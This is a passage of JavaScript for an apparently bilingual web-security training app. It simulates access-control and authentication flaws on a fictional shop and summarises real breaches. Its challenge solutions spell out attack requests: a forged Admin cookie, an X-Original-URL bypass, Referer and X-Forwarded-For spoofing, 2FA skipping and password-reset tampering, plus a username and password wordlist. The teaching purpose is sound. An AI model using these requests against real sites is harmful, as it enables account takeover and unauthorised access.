          const log = [L(`front-end: ${r.path} is allowed`, `前端：${r.path} 被放行`)];
          if (!ov || defended) return { request: values.r, log: [...log, defended && ov ? L('🛡 back-end ignores X-Original-URL', '🛡 后端忽略 X-Original-URL') : ''].filter(Boolean), response: 'HTTP/1.1 200 OK\n\n<h1>Home</h1>', ...(defended ? verdict(false, 'The back-end routes only on the real URL.', '后端只按真实 URL 路由。') : { verdict: 'neutral', message: L('Home page.', '首页。') }) };
          const o = new URL(ov, 'http://x');
          const q = new URLSearchParams([...r.query, ...o.searchParams]);
          const a = adminRoute(o.pathname, q);
          return { request: values.r, log: [...log, L(`back-end routes to ${o.pathname}`, `后端路由到 ${o.pathname}`)], response: a ? a.body : 'HTTP/1.1 404', ...(a ? verdict(true, 'The front-end saw “/”, the back-end served /admin.', '前端看到的是“/”，后端提供的是 /admin。') : { verdict: 'neutral', message: L('Not found.', '未找到。') }) };
        },
      },
    },
    {
      id: 'referer',
      title: L('Referer-based control', '基于 Referer 的控制'),
      summary: L('The sub-pages of /admin check that the Referer header comes from /admin, assuming users always click through. Referer is just a header you can set.', '/admin 的子页面只检查 Referer 头是否来自 /admin，以为用户总是一路点进来的。Referer 只是一个你可以随意设置的请求头。'),
      lab: {
        fields: [{ id: 'ref', label: 'Referer', default: 'https://shop.example/admin' }],
        presets: [
          { label: L('No Referer', '无 Referer'), values: { ref: '' } },
          { label: '…/admin', values: { ref: 'https://shop.example/admin' } },
        ],
        defense: { label: L('Check', '检查方式'), off: 'Referer', on: L('Session role', '会话角色') },
        run({ values, defended }) {
          const request = `GET /admin-roles?username=wiener&action=upgrade HTTP/1.1\nCookie: session=wiener-7f3a${values.ref ? `\nReferer: ${values.ref}` : ''}`;
          if (defended) return { request, log: [L('🛡 wiener is not admin', '🛡 wiener 不是管理员')], response: 'HTTP/1.1 401', ...verdict(false, 'The header no longer matters.', '这个请求头不再起作用。') };
          const ok = /\/admin\/?$/.test(values.ref);
          return { request, log: [L(`Referer ${ok ? 'ends with' : 'does not end with'} /admin`, `Referer ${ok ? '以' : '不以'} /admin 结尾`)], response: ok ? 'HTTP/1.1 302 Found\n\nwiener upgraded to ADMIN' : 'HTTP/1.1 401 Unauthorized', ...(ok ? verdict(true, 'You promoted yourself.', '你给自己升了级。') : { verdict: 'neutral', message: L('Refused without the Referer.', '没有 Referer 就被拒绝。') }) };
        },
      },
    },
  ],
  challenges: [
    {
      title: L('Forge the role cookie', '伪造角色 Cookie'),
      goal: L('You are logged in as wiener. Delete the user carlos through the admin panel. Edit the raw request and send it.', '你以 wiener 身份登录。通过管理面板删除用户 carlos。修改原始请求并发送。'),
      fields: [{ id: 'r', label: L('Raw request', '原始请求'), rows: 3, default: 'GET /admin HTTP/1.1\nHost: shop.example\nCookie: session=wiener-7f3a; Admin=false' }],
      run({ r }) {
        const q = parseReq(r);
        if (!/^true$/i.test(q.cookies.Admin || '')) return { log: [L(`Admin cookie = ${q.cookies.Admin ?? 'missing'}`, `Admin Cookie = ${q.cookies.Admin ?? '缺失'}`)], response: 'HTTP/1.1 401 "Admin interface only available if logged in as an administrator"', a: null };
        const a = adminRoute(q.path, q.query);
        return { log: [L('Admin cookie = true → treated as admin', 'Admin Cookie = true → 被当作管理员')], response: a ? a.body : 'HTTP/1.1 404', a };
      },
      check: (v, o) => o.a?.deleted === 'carlos',
      hint: L('Two changes: the cookie value, and the path (look at the Delete link the admin page gives you).', '要改两处：Cookie 的值，以及路径（看看管理页面给出的 Delete 链接）。'),
      solution: 'GET /admin/delete?username=carlos HTTP/1.1\nHost: shop.example\nCookie: session=wiener-7f3a; Admin=true',
      explain: L('The server trusted a role that the client sends. Authorisation data must live on the server, keyed by the session.', '服务器信任了客户端发来的角色。授权数据必须保存在服务器上，并以会话为键。'),
    },
    {
      title: L('Unguessable is not secret', '不可猜测不等于保密'),
      goal: L('Account pages use GUIDs: /my-account?id=<guid>. Get carlos’s API key and paste it below. A blog page lists authors with links.', '账号页面使用 GUID：/my-account?id=<guid>。拿到 carlos 的 API 密钥并粘贴到下方。某篇博客页面列出了作者及其链接。'),
      context: `<!-- GET /post?postId=3 -->\n<h1>Why we love the beach</h1>\n<p>By <a href="/blogs?userId=${CARLOS_GUID}">carlos</a></p>`,
      fields: [
        { id: 'path', label: L('Request path', '请求路径'), default: `/my-account?id=${WIENER_GUID}` },
        { id: 'key', label: L('carlos’s API key', 'carlos 的 API 密钥'), default: '' },
      ],
      run({ path, key }) {
        let u;
        try {
          u = new URL(path.trim(), 'http://shop.example');
        } catch {
          return { log: [], response: 'HTTP/1.1 400' };
        }
        const who = Object.keys(ACCOUNTS).find((k) => ACCOUNTS[k].guid === u.searchParams.get('id'));
        const response = u.pathname === '/my-account' && who ? acct(who) : 'HTTP/1.1 302 Found\nLocation: /login';
        return { log: [key ? (key.trim() === ACCOUNTS.carlos.key ? L('✓ key matches carlos', '✓ 密钥与 carlos 的一致') : L('✗ that is not carlos’s key', '✗ 这不是 carlos 的密钥')) : L('submit the key once you have it', '拿到密钥后再提交')], response };
      },
      check: (v) => v.key.trim() === ACCOUNTS.carlos.key,
      hint: L('The userId in the blog link is the same GUID the account page uses.', '博客链接里的 userId，正是账号页面使用的那个 GUID。'),
      solution: `/my-account?id=${CARLOS_GUID}  →  ${ACCOUNTS.carlos.key}`,
      explain: L('GUIDs stop enumeration, but IDs appear in links, APIs and logs. The real fix is the same as for numeric IDs: check that the session user owns the object.', 'GUID 能防止遍历，但 ID 会出现在链接、API 和日志里。真正的修复与数字 ID 一样：检查会话用户是否拥有这个对象。'),
    },
    {
      title: L('Slip past the front-end', '溜过前端'),
      goal: L('A front-end proxy returns 403 for any path starting with /admin. The back-end supports X-Original-URL. Delete carlos.', '前端代理对任何以 /admin 开头的路径返回 403。后端支持 X-Original-URL。删除 carlos。'),
      fields: [{ id: 'r', label: L('Raw request', '原始请求'), rows: 4, default: 'GET /admin/delete?username=carlos HTTP/1.1\nHost: shop.example' }],
      run({ r }) {
        const q = parseReq(r);
        if (q.path.toLowerCase().startsWith('/admin')) return { log: [L('front-end: blocked', '前端：已拦截')], response: 'HTTP/1.1 403 "Access denied"', a: null };
        const ov = q.headers['x-original-url'];
        if (!ov) return { log: [L(`front-end: ${q.path} allowed`, `前端：${q.path} 放行`)], response: q.path === '/' ? 'HTTP/1.1 200 OK\n\n<h1>Home</h1>' : 'HTTP/1.1 404', a: null };
        const o = new URL(ov, 'http://x');
        const a = adminRoute(o.pathname, new URLSearchParams([...q.query, ...o.searchParams]));
        return { log: [L(`front-end: ${q.path} allowed`, `前端：${q.path} 放行`), L(`back-end: X-Original-URL → ${o.pathname}`, `后端：X-Original-URL → ${o.pathname}`)], response: a ? a.body : 'HTTP/1.1 404', a };
      },
      check: (v, o) => o.a?.deleted === 'carlos',
      hint: L('Request “/” so the front-end is happy, and put the admin path in X-Original-URL. Where does the query string go? Try the real URL.', '请求“/”让前端放行，再把管理路径放进 X-Original-URL。查询字符串放哪儿？试试放在真实 URL 上。'),
      solution: 'GET /?username=carlos HTTP/1.1\nHost: shop.example\nX-Original-URL: /admin/delete',
      explain: L('Access control done at one layer and routing done at another will drift apart. Enforce authorisation where the action happens, in the application.', '在一层做访问控制、在另一层做路由，两者迟早会产生分歧。在执行操作的地方，也就是应用本身里做授权。'),
    },
  ],
  cases: [
    { year: '2019', ref: L('First American Financial', 'First American Financial'), title: L('885 million documents by changing a number', '改个数字就能看 8.85 亿份文件'), what: L('Journalist Brian Krebs reported that the US title-insurance company’s website served documents such as bank statements and Social Security numbers to anyone with a link. Changing the sequential document number in the URL showed other customers’ records, about 885 million in total, without logging in.', '记者 Brian Krebs 报道称，这家美国产权保险公司的网站会把银行对账单、社会安全号码等文件提供给任何拿到链接的人。只要修改 URL 中连续的文件编号，无需登录就能看到其他客户的记录，总计约 8.85 亿份。'), lesson: L('Sequential IDs + no ownership check = IDOR at enormous scale.', '连续 ID 加上没有所有权检查，就是超大规模的 IDOR。') },
    { year: '2022', ref: L('Optus (Australia)', 'Optus（澳大利亚）'), title: L('An API that didn’t ask who you were', '一个不问你是谁的 API'), what: L('Personal data of about 9.8 million current and former Optus customers was taken through an internet-facing API that did not require authentication. Reports described identifiers that could be iterated to pull records one after another.', '约 980 万名 Optus 现有和前客户的个人数据，经由一个面向互联网、却不需要认证的 API 被窃取。报道称其中的标识符可以被逐个遍历，一条接一条地取出记录。'), lesson: L('Every endpoint needs authentication and authorisation, including “internal” or test ones that end up public.', '每个接口都需要认证和授权，包括那些最终被公开的“内部”或测试接口。') },
  ],
};

/* ====================================================== Authentication */
const MD5 = { peter: '51dc30ddc473d43a6011e9ebba6ca770', montoya: '0e7c53599dfb70ecfc975ee9cfdc9d1d', 123456: 'e10adc3949ba59abbe56e057f20f883e', password: '5f4dcc3b5aa765d61d8327deb882cf99', letmein: '0d107d09f5bbe40cade3de5c71e9e9b7' };
const PW = { wiener: 'peter', carlos: 'montoya' };
const b64 = (s) => (typeof btoa === 'function' ? btoa(s) : Buffer.from(s).toString('base64'));
const unb64 = (s) => {
  try {
    return typeof atob === 'function' ? atob(s) : Buffer.from(s, 'base64').toString();
  } catch {
    return '';
  }
};
const loginReq = (u, p, extra = '') => `POST /login HTTP/1.1${extra}\n\nusername=${u}&password=${p}`;

const ENUM_USERS = ['carlos', 'root', 'admin', 'test', 'guest', 'info', 'adm', 'mysql', 'user', 'administrator', 'oracle', 'ansible', 'ec2-user', 'vagrant', 'azureuser'];
const ENUM_PW = ['123456', 'password', '12345678', 'qwerty', '111111', 'mustang', 'letmein', 'dragon', 'monkey', 'sunshine'];
const ENUM_VALID = ['ansible', 'mustang'];

const auth = {
  variants: [
    {
      id: 'enum',
      title: L('Username enumeration', '用户名枚举'),
      summary: L('If “unknown user” and “wrong password” produce different responses, an attacker can first find real usernames, then only brute-force those.', '如果“用户不存在”和“密码错误”的响应不同，攻击者就能先找出真实的用户名，再只对它们暴力破解。'),
      lab: {
        fields: [
          { id: 'u', label: 'username', default: 'carlos' },
          { id: 'p', label: 'password', default: 'guess' },
        ],
        presets: [
          { label: 'nobody', values: { u: 'nobody', p: 'guess' } },
          { label: 'carlos', values: { u: 'carlos', p: 'guess' } },
        ],
        defense: { label: L('Error message', '错误信息'), off: L('Specific', '具体的'), on: L('Identical', '完全相同') },
        run({ values, defended }) {
          const known = values.u in PW;
          const ok = known && PW[values.u] === values.p;
          const msg = ok ? 'HTTP/1.1 302 Found\nLocation: /my-account' : defended ? 'HTTP/1.1 200 OK\n\nInvalid username or password.' : known ? 'HTTP/1.1 200 OK\n\nIncorrect password' : 'HTTP/1.1 200 OK\n\nInvalid username';
          return { request: loginReq(values.u, values.p), log: [], response: msg, ...(ok ? verdict(true, 'Logged in.', '登录成功。') : !defended && known ? verdict(true, '“Incorrect password” confirms the user exists.', '“Incorrect password”证实了这个用户存在。') : defended ? verdict(false, 'Same answer for every failure.', '所有失败都给出相同的回答。') : { verdict: 'neutral', message: L('Unknown user, and the app says so.', '用户不存在，而且应用直接说了出来。') }) };
        },
      },
      takeaway: L('Check status code, length, wording, and even a missing full stop.', '检查状态码、长度、措辞，甚至少了一个句号。'),
    },
    {
      id: 'timing',
      title: L('Timing enumeration', '时间差枚举'),
      summary: L('Messages are identical, but the app only hashes the password when the user exists. A very long password makes that extra work measurable.', '错误信息完全一致，但应用只在用户存在时才计算密码哈希。用一个很长的密码，就能把这点额外工作放大到可以测量。'),
      lab: {
        fields: [
          { id: 'u', label: 'username', default: 'carlos' },
          { id: 'n', label: L('password length', '密码长度'), default: '500' },
        ],
        presets: [
          { label: L('nobody, 500 chars', 'nobody，500 字符'), values: { u: 'nobody', n: '500' } },
          { label: L('carlos, 500 chars', 'carlos，500 字符'), values: { u: 'carlos', n: '500' } },
          { label: L('carlos, 5 chars', 'carlos，5 字符'), values: { u: 'carlos', n: '5' } },
        ],
        defense: { label: L('Hashing', '哈希计算'), off: L('Only for real users', '只对真实用户'), on: L('Always (dummy hash)', '总是计算（假哈希）') },
        run({ values, defended }) {
          const n = Math.min(Math.max(parseInt(values.n, 10) || 0, 0), 5000);
          const hashes = defended || values.u in PW;
          const ms = 110 + (hashes ? 20 + Math.round(n * 1.6) : 0);
          return { request: loginReq(values.u, `${'a'.repeat(Math.min(n, 12))}${n > 12 ? '…' : ''}`), log: [hashes ? L(`password hashed (${n} chars)`, `计算了密码哈希（${n} 个字符）`) : L('user not found → returned immediately', '用户不存在 → 立即返回')], response: `HTTP/1.1 200 OK  (${ms} ms)\n\nInvalid username or password.`, ...(defended ? verdict(false, 'Every attempt takes the same time.', '每次尝试耗时相同。') : values.u in PW && n > 100 ? verdict(true, 'Much slower than for an unknown user: carlos exists.', '比不存在的用户慢得多：carlos 存在。') : { verdict: 'neutral', message: L('Compare with the other presets.', '和其他预设对比一下。') }) };
        },
      },
    },
    {
      id: 'xff',
      title: L('Rate-limit bypass', '绕过频率限制'),
      summary: L('After three failures your IP is blocked. But the app reads the client IP from X-Forwarded-For, which the client can set to anything.', '失败三次后你的 IP 会被封。但应用从 X-Forwarded-For 读取客户端 IP，而这个头客户端想填什么就填什么。'),
      lab: {
        fields: [{ id: 'x', label: L('X-Forwarded-For (3 failures already from your IP)', 'X-Forwarded-For（你的 IP 已失败 3 次）'), default: '' }],
        presets: [
          { label: L('None', '不设置'), values: { x: '' } },
          { label: '10.0.0.1', values: { x: '10.0.0.1' } },
          { label: '10.0.0.2', values: { x: '10.0.0.2' } },
        ],
        defense: { label: L('Limit keyed on', '限制依据'), off: 'X-Forwarded-For', on: L('Socket IP + account', '真实连接 IP + 账号') },
        run({ values, defended }) {
          const x = values.x.trim();
          const request = loginReq('carlos', 'guess', x ? `\nX-Forwarded-For: ${x}` : '');
          const blocked = defended || !x;
          return { request, log: [blocked ? L('3 failures already counted for this client', '这个客户端已记 3 次失败') : L(`new client ${x}: counter = 0`, `新客户端 ${x}：计数 = 0`)], response: blocked ? 'HTTP/1.1 429\n\nYou have made too many incorrect login attempts. Please try again in 30 minute(s).' : 'HTTP/1.1 200 OK\n\nIncorrect password', ...(blocked ? (defended ? verdict(false, 'Spoofed headers don’t reset anything.', '伪造的请求头重置不了任何东西。') : { verdict: 'neutral', message: L('Locked out.', '被锁住了。') }) : verdict(true, 'Each new fake IP gets three more guesses.', '每个新的伪造 IP 都能再猜三次。')) };
        },
      },
      takeaway: L('Only trust X-Forwarded-For if your own proxy sets it. Limit per account too.', '只有当你自己的代理设置了 X-Forwarded-For 时才信任它。还要按账号限制。'),
    },
    {
      id: '2fa',
      title: L('2FA step skipping', '跳过 2FA 步骤'),
      summary: L('After the password step the session is already treated as logged in; the code page is just the next page. Skip it.', '密码这一步完成后，会话就已经被当作登录状态了，验证码页面只是“下一页”而已。直接跳过它。'),
      lab: {
        fields: [{ id: 'p', label: L('Next request after the password step', '密码步骤之后的下一个请求'), default: '/my-account' }],
        presets: [
          { label: '/login2', values: { p: '/login2' } },
          { label: '/my-account', values: { p: '/my-account' } },
        ],
        defense: { label: L('Session state', '会话状态'), off: L('Logged in after password', '密码后即登录'), on: L('Logged in after 2FA', '2FA 后才登录') },
        run({ values, defended }) {
          const p = values.p.trim();
          const request = `GET ${p} HTTP/1.1\nCookie: session=s-carlos (password ✓, code ✗)`;
          if (p === '/login2') return { request, log: [], response: 'HTTP/1.1 200 OK\n\nPlease enter your 4-digit security code', verdict: 'neutral', message: L('The intended path.', '预期的流程。') };
          if (!p.startsWith('/my-account')) return { request, log: [], response: 'HTTP/1.1 404', verdict: 'neutral', message: L('Not found.', '未找到。') };
          if (defended) return { request, log: [L('🛡 session state = PENDING_2FA', '🛡 会话状态 = PENDING_2FA')], response: 'HTTP/1.1 302 Found\nLocation: /login2', ...verdict(false, 'Sent back to the code page.', '被送回了验证码页面。') };
          return { request, log: [L('session has a user → OK', '会话里有用户 → 放行')], response: acct('carlos'), ...verdict(true, 'Logged in as carlos without the second factor.', '没有第二因素，就以 carlos 的身份登录了。') };
        },
      },
    },
    {
      id: 'reset',
      title: L('Broken password reset', '有缺陷的密码重置'),
      summary: L('The reset form sends a token and a hidden username field. The server checks neither belongs together, or doesn’t check the token at all.', '重置表单会提交一个令牌和一个隐藏的用户名字段。服务器不检查两者是否对应，甚至根本不检查令牌。'),
      lab: {
        fields: [
          { id: 't', label: 'temp-forgot-password-token', default: '' },
          { id: 'u', label: L('username (hidden field)', 'username（隐藏字段）'), default: 'carlos' },
        ],
        presets: [
          { label: L('Your token, wiener', '你的令牌，wiener'), values: { t: '7rbq2', u: 'wiener' } },
          { label: L('Your token, carlos', '你的令牌，carlos'), values: { t: '7rbq2', u: 'carlos' } },
          { label: L('No token, carlos', '无令牌，carlos'), values: { t: '', u: 'carlos' } },
        ],
        defense: { label: L('Token', '令牌'), off: L('Not verified', '不校验'), on: L('Verified and bound to user', '校验并绑定用户') },
        run({ values, defended }) {
          const request = `POST /forgot-password HTTP/1.1\n\ntemp-forgot-password-token=${values.t}&username=${values.u}&new-password-1=x&new-password-2=x`;
          if (defended && !(values.t === '7rbq2' && values.u === 'wiener')) return { request, log: [L('🛡 token 7rbq2 belongs to wiener only', '🛡 令牌 7rbq2 只属于 wiener')], response: 'HTTP/1.1 400 "Invalid token"', ...verdict(false, 'The username comes from the token, not the form.', '用户名来自令牌，而不是表单。') };
          return { request, log: [L(`password of ${values.u} set to x`, `${values.u} 的密码被设置为 x`)], response: 'HTTP/1.1 302 Found\nLocation: /', ...(values.u !== 'wiener' ? verdict(true, `You reset ${values.u}’s password.`, `你重置了 ${values.u} 的密码。`) : { verdict: 'neutral', message: L('Your own reset.', '你自己的重置。') }) };
        },
      },
    },
    {
      id: 'stay',
      title: L('Guessable “stay logged in” cookie', '可猜测的“保持登录” Cookie'),
      summary: L('Decode your own stay-logged-in cookie: base64(username:md5(password)). Now you can forge one for anyone by brute-forcing their password offline-style, without hitting login rate limits.', '解码你自己的“保持登录” Cookie：base64(username:md5(password))。这样你就能为任何人伪造一个，像离线破解一样爆破密码，而不会触发登录频率限制。'),
      lab: {
        fields: [{ id: 'c', label: 'stay-logged-in', default: b64(`carlos:${MD5[123456]}`) }],
        presets: [
          { label: L('Your cookie (wiener)', '你的 Cookie（wiener）'), values: { c: b64(`wiener:${MD5.peter}`) } },
          { label: 'carlos:md5(123456)', values: { c: b64(`carlos:${MD5[123456]}`) } },
          { label: 'carlos:md5(montoya)', values: { c: b64(`carlos:${MD5.montoya}`) } },
        ],
        defense: { label: L('Token', '令牌'), off: 'base64(user:md5(pw))', on: L('Random, stored server-side', '随机，存储在服务端') },
        run({ values, defended }) {
          const request = `GET /my-account HTTP/1.1\nCookie: stay-logged-in=${values.c}`;
          const dec = unb64(values.c.trim());
          const [u, h] = dec.split(':');
          const log = [L(`decodes to ${dec || '(invalid base64)'}`, `解码为 ${dec || '（无效的 base64）'}`)];
          if (defended) return { request, log: [L('🛡 token not found in server-side store', '🛡 服务端存储中找不到该令牌')], response: 'HTTP/1.1 302 Found\nLocation: /login', ...verdict(false, 'A random token reveals nothing and can’t be forged.', '随机令牌不泄露任何信息，也无法伪造。') };
          const ok = PW[u] && MD5[PW[u]] === h;
          return { request, log, response: ok ? acct(u) : 'HTTP/1.1 302 Found\nLocation: /login', ...(ok && u !== 'wiener' ? verdict(true, `Logged in as ${u}. An attacker tries md5 of a password list until one works.`, `以 ${u} 的身份登录了。攻击者会用密码字典的 md5 逐个尝试，直到成功。`) : { verdict: 'neutral', message: L(ok ? 'Your own session.' : 'Wrong guess.', ok ? '你自己的会话。' : '猜错了。') }) };
        },
      },
    },
  ],
  challenges: [
    {
      title: L('Skip the second factor', '跳过第二因素'),
      goal: L('You know carlos’s password (montoya) but not his 2FA code. After the password step the server sent you to /login2. Reach carlos’s account page.', '你知道 carlos 的密码（montoya），但不知道他的 2FA 验证码。密码步骤之后，服务器把你带到了 /login2。进入 carlos 的账号页面。'),
      fields: [{ id: 'r', label: L('Raw request', '原始请求'), rows: 2, default: 'GET /login2 HTTP/1.1\nCookie: session=s-carlos-pw-ok' }],
      run({ r }) {
        const q = parseReq(r);
        const sess = q.cookies.session === 's-carlos-pw-ok';
        if (!sess) return { log: [L('no valid session', '没有有效的会话')], response: 'HTTP/1.1 302 Found\nLocation: /login', ok: false };
        if (q.path === '/login2') return { log: [], response: 'HTTP/1.1 200 OK\n\nPlease enter your 4-digit security code', ok: false };
        if (q.path === '/my-account') return { log: [L('session has user carlos → OK', '会话中有用户 carlos → 放行')], response: acct('carlos'), ok: true };
        return { log: [], response: 'HTTP/1.1 404', ok: false };
      },
      check: (v, o) => o.ok,
      hint: L('What page do you normally land on after logging in? Request it with the same session.', '平时登录之后会落在哪个页面？用同一个会话去请求它。'),
      solution: 'GET /my-account HTTP/1.1\nCookie: session=s-carlos-pw-ok',
      explain: L('Multi-step flows must store which steps are complete and check that on every protected page. A session that exists is not a session that is fully authenticated.', '多步骤流程必须记录哪些步骤已经完成，并在每个受保护页面上检查。会话存在，不等于会话已经完成全部认证。'),
    },
    {
      title: L('Reset someone else’s password', '重置别人的密码'),
      goal: L('You requested a reset for your own account (wiener) and got a link with a token. Change carlos’s password instead.', '你为自己的账号（wiener）申请了密码重置，拿到了带令牌的链接。改为修改 carlos 的密码。'),
      fields: [{ id: 'r', label: L('Raw request', '原始请求'), rows: 4, default: 'POST /forgot-password?temp-forgot-password-token=7rbq2 HTTP/1.1\nHost: shop.example\n\ntemp-forgot-password-token=7rbq2&username=wiener&new-password-1=hunter2&new-password-2=hunter2' }],
      run({ r }) {
        const q = parseReq(r);
        const u = q.form.get('username');
        const p1 = q.form.get('new-password-1');
        const p2 = q.form.get('new-password-2');
        if (q.method !== 'POST' || q.path !== '/forgot-password') return { log: [], response: 'HTTP/1.1 404', who: null };
        if (!u || !p1 || p1 !== p2) return { log: [], response: 'HTTP/1.1 400 "Passwords do not match"', who: null };
        return { log: [L('token not checked against the user', '没有核对令牌与用户是否对应'), L(`password of ${u} updated`, `${u} 的密码已更新`)], response: 'HTTP/1.1 302 Found\nLocation: /', who: u };
      },
      check: (v, o) => o.who === 'carlos',
      hint: L('Look at every parameter in the body. Which one decides whose password changes?', '看看请求体里的每个参数。是哪一个决定了修改谁的密码？'),
      solution: 'POST /forgot-password?temp-forgot-password-token=7rbq2 HTTP/1.1\nHost: shop.example\n\ntemp-forgot-password-token=7rbq2&username=carlos&new-password-1=hunter2&new-password-2=hunter2',
      explain: L('The user to reset must come from the server’s record of the token, never from the form. Tokens should be random, single-use, short-lived and tied to one account.', '要重置的用户必须来自服务器对令牌的记录，而不是表单。令牌应当随机、一次性、短时有效，并绑定到唯一账号。'),
    },
    {
      title: L('Spot the missing full stop', '找出少了的句号'),
      goal: L('Exactly one of these usernames exists and its password is in the list. The error message looks the same for everyone… almost. Log in.', '下列用户名中恰好有一个存在，而且它的密码就在列表里。每个人看到的错误信息都一样……几乎一样。登录进去。'),
      context: L(`usernames: ${ENUM_USERS.join(', ')}\npasswords: ${ENUM_PW.join(', ')}`, `用户名：${ENUM_USERS.join(', ')}\n密码：${ENUM_PW.join(', ')}`),
      fields: [
        { id: 'u', label: 'username', default: 'carlos' },
        { id: 'p', label: 'password', default: '123456' },
      ],
      run({ u, p }) {
        const [vu, vp] = ENUM_VALID;
        const user = u.trim();
        const ok = user === vu && p === vp;
        const response = ok ? 'HTTP/1.1 302 Found\nLocation: /my-account' : user === vu ? 'HTTP/1.1 200 OK\n\nInvalid username or password ' : 'HTTP/1.1 200 OK\n\nInvalid username or password.';
        return { log: [], response, ok };
      },
      check: (v, o) => o.ok,
      hint: L('Look at the very end of the message for each username. In a real test you would use Burp Intruder with a “grep extract” on that line.', '仔细看每个用户名对应信息的最末尾。真实测试中你会用 Burp Intruder 的“grep extract”提取这一行。'),
      solution: `${ENUM_VALID[0]} / ${ENUM_VALID[1]}`,
      explain: L('Two code paths built the message separately, and one left out the full stop. Any difference (text, length, timing, headers) leaks which users exist. Build the failure response once, in one place.', '两条代码路径各自拼出了错误信息，其中一条漏掉了句号。任何差异（文字、长度、耗时、响应头）都会泄露哪些用户存在。失败响应应当在同一个地方只构造一次。'),
    },
  ],
  cases: [
    { year: '2021', ref: L('Colonial Pipeline', 'Colonial Pipeline'), title: L('One password, no MFA', '一个密码，没有 MFA'), what: L('The DarkSide ransomware group got into the largest fuel pipeline operator in the US through a legacy VPN account that used only a password, with no multi-factor authentication. The company shut the pipeline down for several days and paid a ransom of about 4.4 million US dollars.', 'DarkSide 勒索软件团伙通过一个只用密码、没有多因素认证的遗留 VPN 账号，进入了美国最大的燃油管道运营商。公司关闭管道数日，并支付了约 440 万美元赎金。'), lesson: L('Old, forgotten accounts without MFA are prime entry points.', '没有 MFA、被遗忘的旧账号是首选入口。') },
    { year: '2023', ref: L('23andMe', '23andMe'), title: L('Credential stuffing at scale', '大规模撞库'), what: L('Attackers logged into about 14,000 accounts using passwords reused from other breaches. Through the DNA Relatives sharing feature, those accounts exposed profile data of roughly 6.9 million people.', '攻击者使用从其他泄露事件中得到的重复密码，登录了约 1.4 万个账号。通过“DNA 亲属”共享功能，这些账号又暴露了约 690 万人的资料数据。'), lesson: L('Rate limits, breached-password checks and MFA matter even when your own database was never leaked.', '即使你自己的数据库从未泄露，频率限制、泄露密码检测和 MFA 依然重要。') },
  ],
};

export const CORE2 = { ssrf, 'access-control': ac, auth };
